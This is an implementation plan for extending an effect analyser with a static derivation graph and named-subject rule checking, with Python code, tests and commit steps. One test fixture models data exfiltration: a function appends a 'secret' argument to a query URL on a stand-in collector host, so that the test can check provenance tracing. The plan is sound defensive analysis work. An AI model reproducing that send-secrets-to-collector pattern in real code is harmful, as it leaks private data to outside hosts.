# Static Derivation Graph, Named Subjects, Second Guarantee — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Retain the derivation graph `shapes.py` already computes and discards, expose it through two `Surface` queries, use it to resolve named rule subjects (scoped to the declaring file per P-Q18), and measure whether derivation survives arithmetic without label creep (P-Q10).

**Architecture:** Extend the existing constant-evaluation machinery (`Consts`, `const()`, `pattern()`) to carry a `StaticDeriv` node alongside every value, instead of adding a parallel derivation pass. Thread a `current_file`/`func_file` concept through the analyser (mirroring the existing `self.depth` push/pop pattern) so every node can record which file produced it — the hook P-Q18 needs. `Effect` gains a `derivation` field excluded from hash/equality so the fixed point is unaffected. `Surface` exposes `derivation_of`/`origins_of` as the only new public surface; `rules.py` consumes exactly one of them (`origins_of`) to resolve named subjects and render a derivation line, without importing anything but `hashlib`.

**Tech Stack:** Python 3, stdlib only (`dataclasses`, `hashlib`). No new dependencies. Repo's own ad-hoc test runner (`python3 test_shapes.py`, `python3 test_rules.py` — no pytest).

## Global Constraints

- Widening to `UNKNOWN`/`"unknown"` is always sound: never claim provenance the analyser did not establish (v-checkpoint invariant, §2 of build prompt).
- `Effect.derivation` must be excluded from `Effect`'s hash/equality (`field(compare=False)`) — the fixed point's `if not found <= fn_effects[name]` growth check depends on structurally identical effects reached by different paths remaining equal.
- `rules.py` imports nothing but `hashlib`, before and after this build. It may call exactly one new `Surface` query: `origins_of`. It must never construct or inspect a `StaticDeriv` field directly — only `Effect.derivation` (already a public field on a public dataclass) and `Surface.origins_of`'s plain `(name, file)` tuples.
- Every `RuleNotSupported`/`RuleConflict` message names the fix (locked, unbound v1.1 §22 item 1).
- A named-subject rule must never report clean because the graph could not reach it (v2.0 §32, restated in this build's §3.5).
- No new test suite: extend `test_shapes.py` and `test_rules.py` only.
- Recursion/fold bounds already in `shapes.py` (`is_recursive()`, `self.depth > 6` in `const_call`, `self.depth > 4` in `specialise`, `assigned_in()` widening) must not be removed or loosened.
- No governance vocabulary drift: `test_no_governance_vocabulary` (test_shapes.py) bans `policy`, `precedence`, `govern`, `deny` in `shapes.py`; `test_no_governance_vocabulary_in_source` (test_planes.py) bans the same (+ `allow `) in `lexer.py`/`parser.py`/`interp.py`. Nothing in this build touches those words.
- Standing session gate (v1.0 §15): `test_ordinary_program_needs_no_governance` and `test_ordinary_program_is_traceable` in `test_planes.py` must not be modified and must still pass (they exercise `interp.py`, untouched by this build).

---

## Design decisions locked before coding (to carry into the session report)

These resolve ambiguity in the build prompt. Each is a candidate lock — flag for accept/reject in `REPORT_DERIVATION.md`.

1. **`const_value()` wrapper: rejected.** Grepped every call site of `.const(`/`.pattern(`/`.describe(`/`.claim_target(` across the repo — all are internal to `shapes.py`. No external caller exists (not even in tests). Every call site is updated to consume `(value, StaticDeriv)` tuples directly; no compatibility wrapper is introduced.

2. **File-context threading via `self.current_file`, not parameter-passing.** `const()`, `pattern()`, `describe()`, `walk()`, etc. do **not** grow a `file` parameter. Instead `Analyser` gains `self.current_file` (the file whose source is currently being walked) and `self.func_file` (dict: function/foreign name → declaring file path), following the exact push/pop discipline already used for `self.depth` in `specialise()`/`const_call()`. This avoids threading a new argument through ~15 methods and keeps the diff localized to the handful of places that cross a function boundary.

3. **`const()`'s `Var` branch always wraps in a fresh `"name"` node**, per the build prompt's literal instruction ("Var → kind=name, input is the stored node"), even when the stored node is itself a `"name"`, `"param"`, or `"unknown"` node. This means every *read* of an identifier gets its own `"name"`-kind node labeled with that identifier — chains of aliasing (`let v = u`) surface both `u` and `v` in `origins_of`. Consequence (see decision 4): a variable's name survives being read even after its value has widened to `UNKNOWN`, because the wrap happens unconditionally, not only when the value is known.

4. **`pattern()`'s fallback branch reuses the node `const()` already produced, instead of manufacturing a disconnected `StaticDeriv("unknown", "{...}")`.** This is a deliberate deviation from a literal reading of "keep every statically known chunk, mark the rest" — the *original* code discarded the sub-node on the unknown path because it only tracked strings. Once nodes exist, discarding the node `const()` already built (which may be a `"name"` node wrapping an `"unknown"` one) would throw away exactly the provenance chain `origins_of` needs. Reusing it costs nothing and is what makes test scenario 2 in §5 (below) meaningful instead of vacuous.

5. **Consequence of (3)+(4): `RuleNotSupported`'s four bullets in §3.5 of the build prompt collapse to three in this implementation.** Because a `Var` read always wraps in `"name"` regardless of whether the underlying value is known, a subject name that was rebound-and-widened at a branch/loop join is **still discoverable by label** through `origins_of` (the `"name"` wrapper survives; only the `"unknown"` node underneath signals the widening). This means the build prompt's third and fourth bullets — "resolves to nothing" vs. "derivation widened to unknown" — are not separately reachable states given this design: if the label isn't found at all, it's bullet 3; a genuinely present name is always resolvable to a file via `origins_of`, whether or not its value was widened. **Decision: collapse bullets 3 and 4 into one `RuleNotSupported` message** ("subject does not resolve to anything in the traced effect surface"), and flag this explicitly in the session report per the build prompt's own instruction to name undocumented decisions rather than silently absorb them. `origins_of` remains the only query `rules.py` needs (satisfying §3.4's "exactly one more public query name").

6. **Rule resolution scans the whole surface, not just kind-matching effects.** `_resolve_subject` collects `origins_of()` over *every* declared effect (any kind), because a subject may be a name that only ever flows into a `write` even though the rule is about `ask` — the rule is still meaningfully "resolvable" (it just never matches anything), which is different from the name not existing at all. Per-effect matching (`_subject_matches`) is the narrower, per-effect check used inside the forbid/permit loops.

7. **`check()` gains one new parameter: `declaring_file=None`.** Defaults to `None` so every existing `test_rules.py` call site (`check(found, surface)`, built from `analyse(src)` with no path) keeps working unchanged — `analyse(src)` never sets a file, so every node's `file` is `None`, and `declaring_file=None` matches by construction. `shapes_cli.py` passes `declaring_file=path` (the entry file, matching how it already re-parses `path` for `Rule` statements).

---

## File-by-file change map

- **`shapes.py`** — `StaticDeriv` dataclass; `Consts` stores `(value, node)`; `Analyser` gains `self.current_file`/`self.func_file`/`self.entry_file`; `const()`, `const_builtin()`, `const_call()`, `pattern()`, `describe()`, `claim_target()`, `specialise()`, `foreign_effects()`, `collect_declarations()`, `walk()` updated; `Effect.derivation` field; `Surface.derivation_of()`/`origins_of()`; `analyse()`/`analyse_file()` thread `file`.
- **`rules.py`** — `check()` gains `declaring_file` param; new `_resolve_subject()`, `_subject_matches()`; `Violation` gains `origins` field and a derivation line in `render()`; updated docstrings (the "this slice does not build" claim is now false).
- **`shapes_cli.py`** — pass `declaring_file=path` to `check_rules(...)`; new `--derivation-stats` flag.
- **`test_shapes.py`** — new tests for nodes/widening/literal-tracing/fixed-point termination with derivation.
- **`test_rules.py`** — new tests for named-subject same-file/imported-file/unresolvable, `rules.py` import assertion, §24 derivation line; **one existing test's expected message text changes** (`test_named_subject_raises_rather_than_passing_silently`) — argued in the report per decision 5 above.
- **`REPORT_DERIVATION.md`** — new file, the session report required by build-prompt §7.

No new files beyond the report. No test suite beyond the two existing ones.

---

## Task 1: `StaticDeriv`, file-threading, and node-carrying constant evaluation

This is build-prompt §6 steps 1–2 combined — they are inseparable in practice: `Consts` cannot usefully store nodes until `const()` produces them, and `const()` cannot produce them without `Consts` to store/retrieve them. Splitting them into two commits would mean an intermediate commit that doesn't run. One task, one checkpoint: **all existing tests must still pass at the end of this task**, with zero behavior change to values, targets, or effect sets.

**Files:**
- Modify: `shapes.py` (whole file's constant-evaluation section, roughly lines 206–835)
- Test: `test_shapes.py` (run existing suite; add new node-shape tests)

**Interfaces produced for later tasks:**
- `StaticDeriv(kind, label, inputs=(), origin=None, file=None)` — frozen dataclass.
- `Analyser.const(node, consts) -> (value, StaticDeriv)`
- `Analyser.pattern(node, consts) -> (text, StaticDeriv)`
- `Analyser.describe(node, consts) -> (text, computed_bool, StaticDeriv)` — **arity change from 2 to 3**, every caller in `walk()`/`claim_target()` updated in this same task.
- `Consts.get(name) -> (value, StaticDeriv)`; `Consts.set(name, value, node)`.
- `Analyser.current_file`, `Analyser.func_file` (dict name→path), `Analyser.entry_file`.

- [ ] **Step 1: Add `StaticDeriv` and switch `Consts` to store pairs**

In `shapes.py`, after the `Unknown`/`UNKNOWN` block, add:

```python
@dataclass(frozen=True)
class StaticDeriv:
    """One node in the static derivation graph. Mirrors interp.Deriv's shape
    deliberately — same field names, same meanings — so a reader who knows
    one knows the other.

    Frozen and tuple-typed because Effect is frozen and hashed into sets; a
    mutable `inputs` list would break Effect's hashability, which the fixed
    point depends on.
    """
    kind: str                    # literal|name|op|call|param|foreign|unknown
    label: str
    inputs: tuple = ()
    origin: Optional[str] = None # where this entered the program
    file: Optional[str] = None   # declaring file, for P-Q18 scoping
```

Replace the `Consts` class body:

```python
class Consts:
    """Statically known values, scoped like the runtime environment.

    Stores a (value, StaticDeriv) pair per name. Only tracks what can be
    known without running anything: string and number literals, and
    concatenations of them. Anything touched by input, a call with unknown
    arguments, or a comprehension variable becomes UNKNOWN and stays that
    way. Widening to UNKNOWN is always sound — it loses precision, never
    correctness.
    """

    def __init__(self, parent=None):
        self.vals = {}
        self.parent = parent

    def get(self, name):
        if name in self.vals:
            return self.vals[name]
        if self.parent is not None:
            return self.parent.get(name)
        return UNKNOWN, StaticDeriv("unknown", name)

    def set(self, name, value, node):
        self.vals[name] = (value, node)

    def child(self):
        return Consts(self)
```

- [ ] **Step 2: Thread file-context on `Analyser`**

In `Analyser.__init__`, add after `self.foreigns = {}`:

```python
        self.func_file = {}      # name -> file path that declared it
        self.foreign_file = {}   # name -> file path that declared it
        self.entry_file = None   # the file the surface is being computed for
        self.current_file = None # file whose source is currently being walked
```

- [ ] **Step 3: Record declaring file in `collect_declarations`**

Change the signature and the two spots that register a name:

```python
    def collect_declarations(self, prog, renames=None, file=None):
        """Functions and modules, at any depth.

        A renamed function is registered under the name importers use, so
        the surface is computed over the call graph as written. `file` is
        the path this program text came from — recorded per declaration so
        a later named-subject rule can tell whether a binding is local to
        the file that wrote the rule (P-Q18).
        """
        renames = renames or {}

        def scan(node):
            if isinstance(node, Foreign):
                name = renames.get(node.name, node.name)
                self.foreigns[name] = node
                self.foreign_file[name] = file
                if node.name in renames:
                    self.local[node.name] = renames[node.name]
                return
            if isinstance(node, FuncDef):
                exported = renames.get(node.name, node.name)
                self.funcs[exported] = node
                self.func_file[exported] = file
                if exported != node.name:
                    self.local[node.name] = exported
                for s in node.body:
                    scan(s)
            elif isinstance(node, Use):
                self.modules.add(node.module)
            elif isinstance(node, If):
                for s in node.then + node.els:
                    scan(s)
            elif isinstance(node, ForEach):
                for s in node.body:
                    scan(s)
        for stmt in prog:
            scan(stmt)
```

- [ ] **Step 4: Set `current_file` around the fixed point and top level, in `analyse_prog`**

```python
    def analyse_prog(self, prog):
        fn_effects = {name: set() for name in self.funcs}
        changed = True
        rounds = 0
        while changed:
            changed = False
            rounds += 1
            if rounds > 200:
                break
            for name, fn in self.funcs.items():
                inner = Consts()
                self.current_file = self.func_file.get(name, self.entry_file)
                for p in fn.params:
                    inner.set(p, UNKNOWN,
                             StaticDeriv("param", p, file=self.current_file))
                found = set()
                for stmt in fn.body:
                    found |= self.walk(stmt, fn_effects, inner)
                if not found <= fn_effects[name]:
                    fn_effects[name] |= found
                    changed = True

        top = set()
        top_consts = Consts()
        self.current_file = self.entry_file
        for stmt in prog:
            if isinstance(stmt, FuncDef):
                continue
            top |= self.walk(stmt, fn_effects, top_consts)

        surface = Surface(
            effects=sorted(top, key=lambda e: (e.boundary, e.kind, e.target)),
            functions={n: sorted(s, key=lambda e: (e.boundary, e.kind, e.target))
                       for n, s in fn_effects.items()},
            modules=set(self.modules),
            unresolved=list(self.unresolved),
            foreign=sorted(
                {e for d in self.foreigns.values()
                 for e in self.foreign_effects(d)},
                key=lambda e: (e.boundary, e.kind, e.target)),
        )
        return surface
```

(Only the two `current_file` lines and the `StaticDeriv(...)` literal in the param-seeding loop are new; the rest of the method is unchanged and shown for context/placement.)

- [ ] **Step 5: `analyse()`/`analyse_file()` set `entry_file`**

```python
def analyse(src, file=None):
    a = Analyser()
    a.entry_file = file
    return a.analyse(src)


def analyse_file(path, follow=True):
    if not follow:
        return analyse(open(path).read(), file=path)

    from modules import (load_graph, names_in_graph, check_collisions,
                         rename_map)
    graph = load_graph(path)
    check_collisions(graph)
    known = names_in_graph(graph)
    renames = rename_map(graph)
    combined = Analyser()
    combined.entry_file = os.path.abspath(path)
    entry_prog = None
    for p, src in graph:
        prog = parse(src, known)
        combined.collect_declarations(prog, renames.get(p, {}),
                                      file=os.path.abspath(p))
        if os.path.abspath(p) == os.path.abspath(path):
            entry_prog = prog
    return combined.analyse_prog(entry_prog)
```

Note: `Analyser.analyse(self, src)` (the instance method) calls `self.collect_declarations(prog)` with no `file=` — for that path (`analyse(src, file=...)` module function), thread it through:

```python
    def analyse(self, src):
        prog = parse(src)
        self.collect_declarations(prog, file=self.entry_file)
        return self.analyse_prog(prog)
```

- [ ] **Step 6: `const()` — every branch returns `(value, StaticDeriv)`**

Replace the whole method:

```python
    def const(self, node, consts):
        """Best static approximation of a value, paired with its derivation
        node. UNKNOWN pairs with a StaticDeriv("unknown", ...) node rather
        than None — an unknown value still has provenance worth reporting.

        Widening to UNKNOWN is always sound: it costs precision in the
        target description, never correctness of the effect set.
        """
        if node is None:
            return UNKNOWN, StaticDeriv("unknown", "nothing",
                                        file=self.current_file)

        if isinstance(node, Str):
            return node.value, StaticDeriv("literal", f'"{node.value}"',
                                           file=self.current_file)
        if isinstance(node, Num):
            return node.value, StaticDeriv("literal", str(node.value),
                                           file=self.current_file)
        if isinstance(node, Bool):
            label = "true" if node.value else "false"
            return node.value, StaticDeriv("literal", label,
                                           file=self.current_file)

        if isinstance(node, Var):
            value, stored = consts.get(node.name)
            return value, StaticDeriv("name", node.name, inputs=(stored,),
                                      file=self.current_file)

        if isinstance(node, OrFail):
            return self.const(node.expr, consts)

        if isinstance(node, BinOp) and node.op == "+":
            l, ln = self.const(node.left, consts)
            r, rn = self.const(node.right, consts)
            if l is UNKNOWN or r is UNKNOWN:
                return UNKNOWN, StaticDeriv("unknown", "+", inputs=(ln, rn),
                                            file=self.current_file)
            v = self.as_text(l) + self.as_text(r) if (
                isinstance(l, str) or isinstance(r, str)) else l + r
            return v, StaticDeriv("op", "+", inputs=(ln, rn),
                                  file=self.current_file)

        if isinstance(node, Builtin) and node.name == "text":
            v, vn = self.const(node.arg, consts)
            if v is UNKNOWN:
                return UNKNOWN, StaticDeriv("unknown", "text of",
                                            inputs=(vn,), file=self.current_file)
            return self.as_text(v), StaticDeriv("op", "text of", inputs=(vn,),
                                                file=self.current_file)

        if isinstance(node, Builtin) and node.name in ("lower", "upper"):
            v, vn = self.const(node.arg, consts)
            label = f"{node.name} of"
            if v is UNKNOWN:
                return UNKNOWN, StaticDeriv("unknown", label, inputs=(vn,),
                                            file=self.current_file)
            result = str(v).lower() if node.name == "lower" else str(v).upper()
            return result, StaticDeriv("op", label, inputs=(vn,),
                                       file=self.current_file)

        if isinstance(node, Call):
            if node.name in BUILTIN_NAMES and node.name not in self.funcs:
                return self.const_builtin(node, consts)
            return self.const_call(node, consts)

        return UNKNOWN, StaticDeriv("unknown", "{...}", file=self.current_file)
```

- [ ] **Step 7: `const_builtin()`**

```python
    def const_builtin(self, node, consts):
        """Fold the pure builtins. Effect builtins are never constant."""
        if len(node.args) != 1 or node.name in EFFECT_KINDS:
            return UNKNOWN, StaticDeriv("unknown", node.name,
                                        file=self.current_file)
        v, n = self.const(node.args[0], consts)
        label = f"{node.name} of"
        if v is UNKNOWN:
            return UNKNOWN, StaticDeriv("unknown", label, inputs=(n,),
                                        file=self.current_file)
        if node.name == "text":
            return self.as_text(v), StaticDeriv("op", label, inputs=(n,),
                                                file=self.current_file)
        if node.name == "lower":
            return str(v).lower(), StaticDeriv("op", label, inputs=(n,),
                                               file=self.current_file)
        if node.name == "upper":
            return str(v).upper(), StaticDeriv("op", label, inputs=(n,),
                                               file=self.current_file)
        return UNKNOWN, StaticDeriv("unknown", label, inputs=(n,),
                                    file=self.current_file)
```

- [ ] **Step 8: `const_call()` — cross a function boundary; `"call"` node's inputs are the argument nodes only**

Deliberately does *not* fold the callee's internal derivation chain into the caller's graph — only the argument nodes. This keeps node counts from growing multiplicatively across nested calls (directly relevant to the P-Q10 creep measurement in Task 4), mirroring how `specialise()`/`const_call()` already cap depth rather than inline unboundedly.

```python
    def const_call(self, node, consts):
        """Evaluate a call statically when its body is a single `give`.

        Bounded by depth: this is constant folding, not an interpreter, and
        it must never loop on recursion.
        """
        fn = self.funcs.get(node.name)
        if fn is None or self.depth > 6:
            return UNKNOWN, StaticDeriv("unknown", node.name,
                                        file=self.current_file)
        if self.is_recursive(node.name):
            return UNKNOWN, StaticDeriv("unknown", node.name,
                                        file=self.current_file)
        arg_pairs = [self.const(a, consts) for a in node.args]
        args = [v for v, _ in arg_pairs]
        if len(args) != len(fn.params):
            return UNKNOWN, StaticDeriv("unknown", node.name,
                                        file=self.current_file)
        gives = [s for s in fn.body if isinstance(s, Give)]
        if len(gives) != 1 or len(fn.body) != 1:
            return UNKNOWN, StaticDeriv("unknown", node.name,
                                        file=self.current_file)

        callee_file = self.func_file.get(node.name, self.current_file)
        inner = Consts()
        for p, (v, n) in zip(fn.params, arg_pairs):
            inner.set(p, v, StaticDeriv("param", p, inputs=(n,), file=callee_file))

        prev_file, self.current_file = self.current_file, callee_file
        self.depth += 1
        try:
            value, _ = self.const(gives[0].expr, inner)
        finally:
            self.depth -= 1
            self.current_file = prev_file

        arg_nodes = tuple(n for _, n in arg_pairs)
        return value, StaticDeriv("call", node.name, inputs=arg_nodes,
                                  file=self.current_file)
```

- [ ] **Step 9: `describe()` and `pattern()`**

```python
    def describe(self, node, consts):
        """Static description of an effect's target, paired with its node.

        A fully known value gives the exact target. A partly known one
        keeps its literal parts so the host and shape stay visible.
        """
        v, n = self.const(node, consts)
        if v is not UNKNOWN:
            return self.as_text(v), False, n
        text, n2 = self.pattern(node, consts)
        return text, True, n2

    def pattern(self, node, consts):
        """Keep every statically known chunk, mark the rest.

        The fallback branch returns the node `const()` already built for
        this node, rather than a fresh disconnected unknown node — that
        node may itself be a name wrapping an unknown value, and that
        chain is exactly what a derivation query needs to preserve.
        """
        if node is None:
            return "{...}", StaticDeriv("unknown", "{...}",
                                        file=self.current_file)
        v, n = self.const(node, consts)
        if v is not UNKNOWN:
            return self.as_text(v), n
        if isinstance(node, OrFail):
            return self.pattern(node.expr, consts)
        if isinstance(node, BinOp) and node.op == "+":
            lt, ln = self.pattern(node.left, consts)
            rt, rn = self.pattern(node.right, consts)
            return lt + rt, StaticDeriv("op", "+", inputs=(ln, rn),
                                        file=self.current_file)
        return "{...}", n
```

- [ ] **Step 10: `claim_target()` — third return value**

```python
    def claim_target(self, decl, where, args, consts):
        """Where a declared effect goes, as specifically as can be known."""
        if where is None:
            return (f"{decl.target} (destination not stated)", True,
                    StaticDeriv("foreign", decl.target, file=self.current_file,
                               origin=f"foreign:{decl.target}"))
        kind, value = where
        if kind == "literal":
            return (value, False,
                    StaticDeriv("literal", f'"{value}"', file=self.current_file))
        if args is not None and consts is not None:
            try:
                i = decl.params.index(value)
            except ValueError:
                i = -1
            if 0 <= i < len(args):
                v, n = self.const(args[i], consts)
                if v is not UNKNOWN:
                    return (self.as_text(v), False,
                            StaticDeriv("foreign", decl.target, inputs=(n,),
                                       file=self.current_file,
                                       origin=f"foreign:{decl.target}"))
                text, n2 = self.pattern(args[i], consts)
                return (text, True,
                        StaticDeriv("foreign", decl.target, inputs=(n2,),
                                   file=self.current_file,
                                   origin=f"foreign:{decl.target}"))
        return ("{...}", True,
                StaticDeriv("foreign", decl.target, file=self.current_file,
                           origin=f"foreign:{decl.target}"))
```

- [ ] **Step 11: `foreign_effects()` — pass the file, use `claim_target`'s node (not stored yet — that's Task 2)**

For this task, only fix the call site so it still runs (`claim_target` now returns 3 values); the resulting node is threaded into `Effect.derivation` in Task 2, so for now just unpack and discard the third value with `_`:

```python
    def foreign_effects(self, decl, args=None, consts=None):
        if not decl.declared:
            return {Effect("unknown", "foreign", decl.target,
                           computed=True, site=decl.line, claimed=True)}
        out = set()
        for kind, where in decl.effects:
            boundary = EFFECT_KINDS.get(kind, "foreign")
            target, computed, _n = self.claim_target(decl, where, args, consts)
            out.add(Effect(kind, boundary, target, computed,
                           site=decl.line, claimed=True))
        return out
```

- [ ] **Step 12: `specialise()` — bind params with nodes, push/pop `current_file`**

```python
    def specialise(self, node, fn_effects, consts):
        generic = set(fn_effects[node.name])
        fn = self.funcs.get(node.name)
        if fn is None or self.depth > 4:
            return generic
        if self.is_recursive(node.name):
            return generic
        arg_pairs = [self.const(a, consts) for a in node.args]
        args = [v for v, _ in arg_pairs]
        if len(args) != len(fn.params) or all(a is UNKNOWN for a in args):
            return generic

        callee_file = self.func_file.get(node.name, self.current_file)
        inner = Consts()
        for p, (v, n) in zip(fn.params, arg_pairs):
            inner.set(p, v, StaticDeriv("param", p, inputs=(n,), file=callee_file))

        prev_file, self.current_file = self.current_file, callee_file
        self.depth += 1
        try:
            special = set()
            for s in fn.body:
                special |= self.walk(s, fn_effects, inner)
        finally:
            self.depth -= 1
            self.current_file = prev_file

        sharpened = set()
        for g in generic:
            better = [s for s in special
                      if s.kind == g.kind and s.boundary == g.boundary
                      and not s.computed]
            if g.computed and better:
                sharpened |= set(better)
            else:
                sharpened.add(g)
        return sharpened | {s for s in special
                            if not any(s.kind == g.kind for g in generic)}
```

- [ ] **Step 13: `walk()` call-site fixups (arity changes only, behavior unchanged)**

Four spots change from `target, computed = self.describe(...)` to `target, computed, _n = self.describe(...)` (the node is wired into `Effect` in Task 2, so it's discarded here with `_n` for now): the `Builtin` branch (ask/read), `WriteTo`, `Show`, and the effect-`Call` branch. The `Assign` branch changes from
`consts.set(node.name, self.const(node.expr, consts))` to:

```python
        if isinstance(node, Assign):
            out |= self.walk(node.expr, fn_effects, consts)
            value, node_ = self.const(node.expr, consts)
            consts.set(node.name, value, node_)
            return out
```

And the `If`/`ForEach` widening loops change from `consts.set(name, UNKNOWN)` to:

```python
            for name in self.assigned_in(node.then + node.els):
                consts.set(name, UNKNOWN,
                          StaticDeriv("unknown", name, file=self.current_file))
```

(same pattern for `ForEach`'s post-body widening, and `inner.set(node.var, UNKNOWN)` becomes
`inner.set(node.var, UNKNOWN, StaticDeriv("unknown", node.var, file=self.current_file))`).

- [ ] **Step 14: Run the existing suites — must be green with zero behavior change**

```bash
python3 test_shapes.py
python3 test_rules.py
python3 test_planes.py
```
Expected: same pass count as before this task (record the "before" count first via `git stash` + run, or just trust git history — record in the report). Any failure here means a node-carrying change altered a *value* or *target string*, which must not happen — fix before proceeding.

- [ ] **Step 15: Add node-shape tests to `test_shapes.py`**

```python
def test_derivation_reaches_a_literal():
    s = analyse('use http\nlet u = "https://x"\nx = ask u')
    e = s.at("network")[0]
    assert e.derivation is not None
    assert e.derivation.kind == "name"
    assert e.derivation.label == "u"
    literal = e.derivation.inputs[0]
    assert literal.kind == "literal"


def test_widening_produces_an_unknown_provenance_node():
    src = ('use http\n'
           'let u = "https://example.com/default.json"\n'
           'if 1 > 0:\n'
           '  let u = "https://example.com/other.json"\n'
           'x = ask u')
    s = analyse(src)
    e = s.at("network")[0]

    def has_unknown(n, seen=None):
        seen = seen or set()
        if id(n) in seen:
            return False
        seen.add(id(n))
        if n.kind == "unknown":
            return True
        return any(has_unknown(i, seen) for i in n.inputs)

    assert has_unknown(e.derivation)


def test_target_from_ask_output_does_not_claim_provenance():
    src = ('use http\n'
           'to get of url:\n'
           '  give ask url\n\n'
           'xs = for each u in [1, 2]: get of u')
    s = analyse(src)
    e = s.at("network")[0]
    assert e.derivation is not None
    assert e.derivation.kind != "literal"
```

- [ ] **Step 16: Run and confirm green**

```bash
python3 test_shapes.py
```
Expected: all pass, including the three new tests.

- [ ] **Step 17: Commit**

```bash
git add shapes.py test_shapes.py
git commit -m "shapes: carry a static derivation node alongside every constant value"
```

---

## Task 2: `Effect.derivation`

**Files:**
- Modify: `shapes.py` (`Effect` dataclass, every `Effect(...)` construction site in `walk()` and `foreign_effects()`)
- Test: `test_shapes.py`

**Interfaces produced:**
- `Effect.derivation: Optional[StaticDeriv] = field(default=None, compare=False)`

- [ ] **Step 1: Add the field**

```python
@dataclass(frozen=True)
class Effect:
    kind: str
    boundary: str
    target: str
    computed: bool = False
    site: int = 0
    claimed: bool = False
    derivation: Optional[Any] = field(default=None, compare=False)

    def __str__(self):
        # unchanged
        ...
```

`Any` is already imported (`from typing import Any, Optional`). `field` is already imported (`from dataclasses import dataclass, field`).

- [ ] **Step 2: Wire the node through every construction site in `walk()`**

Restore the discarded `_n`/`_` names from Task 1 Step 13 into real values and pass them:

```python
        if isinstance(node, Builtin):
            out |= self.walk(node.arg, fn_effects, consts)
            if node.name in ("ask", "read"):
                target, computed, deriv = self.describe(node.arg, consts)
                out.add(Effect(node.name, EFFECT_KINDS[node.name],
                               target, computed, derivation=deriv))
            return out

        if isinstance(node, WriteTo):
            out |= self.walk(node.value, fn_effects, consts)
            out |= self.walk(node.dest, fn_effects, consts)
            target, computed, deriv = self.describe(node.dest, consts)
            out.add(Effect("write", "file", target, computed, site=node.line,
                           derivation=deriv))
            return out

        if isinstance(node, Show):
            out |= self.walk(node.expr, fn_effects, consts)
            target, computed, deriv = self.describe(node.expr, consts)
            out.add(Effect("show", "console", target, computed, site=node.line,
                           derivation=deriv))
            return out

        if isinstance(node, Call):
            for a in node.args:
                out |= self.walk(a, fn_effects, consts)
            if node.name in EFFECT_KINDS and node.name not in self.funcs:
                arg = node.args[0] if node.args else None
                target, computed, deriv = self.describe(arg, consts)
                out.add(Effect(node.name, EFFECT_KINDS[node.name],
                               target, computed, site=node.line, derivation=deriv))
                return out
            # ... rest unchanged
```

- [ ] **Step 3: Wire it through `foreign_effects()`**

```python
    def foreign_effects(self, decl, args=None, consts=None):
        if not decl.declared:
            return {Effect("unknown", "foreign", decl.target,
                           computed=True, site=decl.line, claimed=True,
                           derivation=StaticDeriv("foreign", decl.target,
                                                  file=self.current_file))}
        out = set()
        for kind, where in decl.effects:
            boundary = EFFECT_KINDS.get(kind, "foreign")
            target, computed, deriv = self.claim_target(decl, where, args, consts)
            out.add(Effect(kind, boundary, target, computed,
                           site=decl.line, claimed=True, derivation=deriv))
        return out
```

- [ ] **Step 4: Termination tests — the checkpoint this task exists for**

Add to `test_shapes.py`:

```python
def test_fixed_point_terminates_with_derivation_on_hn():
    """Effect.derivation must not break the fixed point's growth check —
    it is excluded from hash/equality via field(compare=False)."""
    s = analyse_file("hn.planes")
    assert s.touches("network")


def test_fixed_point_terminates_on_mutual_recursion_with_derivation():
    src = ('use http\n'
           'to ping of n:\n'
           '  if n > 0:\n'
           '    give pong of (n - 1)\n'
           '  give ask "https://example.com/a.json"\n\n'
           'to pong of n:\n'
           '  give ping of (n - 1)\n\n'
           'r = ping of 3')
    s = analyse(src)
    assert s.touches("network")
    assert s.functions["pong"]


def test_effect_derivation_excluded_from_equality():
    """Two structurally identical effects with different derivations must
    still compare equal and hash the same, or the fixed point may not
    terminate."""
    from shapes import Effect, StaticDeriv
    a = Effect("ask", "network", "https://x", derivation=StaticDeriv("literal", "a"))
    b = Effect("ask", "network", "https://x", derivation=StaticDeriv("literal", "b"))
    assert a == b
    assert hash(a) == hash(b)
```

- [ ] **Step 5: Run full suite**

```bash
python3 test_shapes.py
python3 test_rules.py
```
Expected: all green. If `hn.planes` hangs or the round count grows unboundedly, the equality exclusion in Step 1 is wrong — stop and fix before continuing (do not add a workaround elsewhere).

- [ ] **Step 6: Commit**

```bash
git add shapes.py test_shapes.py
git commit -m "shapes: attach a static derivation to every Effect"
```

---

## Task 3: `Surface.derivation_of` / `origins_of`

**Files:**
- Modify: `shapes.py` (`Surface` class)
- Test: `test_shapes.py`

**Interfaces produced:**
- `Surface.derivation_of(effect) -> Optional[StaticDeriv]`
- `Surface.origins_of(effect) -> list[tuple[str, Optional[str]]]`

- [ ] **Step 1: Implement both queries**

Add to the `Surface` class, near the other query methods (after `claims()`/`targets()`):

```python
    def derivation_of(self, effect):
        """The static derivation of this effect's target, or None."""
        return effect.derivation

    def origins_of(self, effect):
        """Every name and file this effect's target provably derives from.

        The static analogue of interp.origins(): walks the derivation graph
        and returns every reachable name/param-kind node's (label, file).
        Duplicates are possible (the same identifier read at more than one
        point in the chain) and are not deduplicated here — callers that
        want a set can dedupe.
        """
        node = effect.derivation
        if node is None:
            return []
        found = []
        seen = set()

        def walk(n):
            if id(n) in seen:
                return
            seen.add(id(n))
            if n.kind in ("name", "param"):
                found.append((n.label, n.file))
            for i in n.inputs:
                walk(i)

        walk(node)
        return found
```

- [ ] **Step 2: Tests**

```python
def test_derivation_of_returns_the_effect_node():
    s = analyse('use http\nx = ask "https://example.com/a.json"')
    e = s.at("network")[0]
    assert s.derivation_of(e) is e.derivation
    assert s.derivation_of(e).kind == "literal"


def test_origins_of_finds_a_named_parameter():
    s = analyse('use http\n'
                'to send of payload:\n'
                '  give ask "https://collector.example.com/?d=" + payload\n\n'
                'x = send of "secret"\n')
    e = s.at("network")[0]
    origins = s.origins_of(e)
    names = {n for n, _f in origins}
    assert "payload" in names


def test_origins_of_empty_for_a_bare_literal():
    s = analyse('use http\nx = ask "https://example.com/a.json"')
    e = s.at("network")[0]
    assert s.origins_of(e) == []
```

- [ ] **Step 3: Run and commit**

```bash
python3 test_shapes.py
git add shapes.py test_shapes.py
git commit -m "shapes: expose derivation_of/origins_of on Surface"
```

---

## Task 4: `--derivation-stats` and the P-Q10 measurement (reporting gate)

**Files:**
- Modify: `shapes_cli.py`

**Interfaces produced:** none consumed by later tasks — this is a measurement checkpoint. **Do not proceed to Task 5 until the numbers are reported and reviewed** (build-prompt §6: "Step 5 is a reporting gate").

